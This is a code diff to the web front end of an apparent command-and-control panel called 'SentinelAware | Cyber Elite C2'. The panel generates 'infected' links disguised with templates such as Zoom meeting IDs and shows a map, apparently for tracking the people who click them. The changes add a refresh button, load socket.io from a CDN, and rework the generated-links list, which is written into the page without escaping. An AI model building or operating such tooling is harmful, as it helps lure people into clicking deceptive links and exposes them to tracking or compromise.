@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SentinelAware | Cyber Elite C2</title>
-    <script src="/socket.io/socket.io.js"></script>
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
@@ -408,6 +408,7 @@
                     <option value="zoom">Zoom Meeting ID</option>
                 </select>
                 <button class="btn-cyber" onclick="createLink()">GENERATE INFECTED LINK</button>
+                <button class="btn-cyber" style="background:#222; color:#00ff88; border:1px solid #00ff88; font-size:10px; margin-top:5px;" onclick="loadData()">🔄 FORÇAR ATUALIZAÇÃO</button>
                 <div id="links-list" style="margin-top:20px; font-size: 0.65rem;"></div>
             </div>
 
@@ -492,9 +493,13 @@
             }
         }
 
-        function renderLinks(links) {
+        function renderLinks(linksData) {
             const c = document.getElementById('links-list');
-            c.innerHTML = links.reverse().slice(0, 3).map(l => `
+            if (!linksData || linksData.length === 0) {
+                c.innerHTML = '<div style="opacity:0.5; text-align:center;">Nenhum link gerado ainda.</div>';
+                return;
+            }
+            c.innerHTML = linksData.slice(0, 5).map(l => `
                 <div style="background:rgba(255,255,255,0.05); padding:10px; border-radius:10px; margin-bottom:10px; display:flex; justify-content:space-between; align-items:center;">
                     <div style="overflow:hidden;"><b>${l.template.toUpperCase()}</b><br><span style="opacity:0.5;">${l.url}</span></div>
                     <button onclick="copy('${window.location.origin}${l.url}')" style="background:var(--primary); border:none; padding:5px 10px; border-radius:5px; font-size:0.6rem; font-weight:bold; cursor:pointer;">COPY</button>
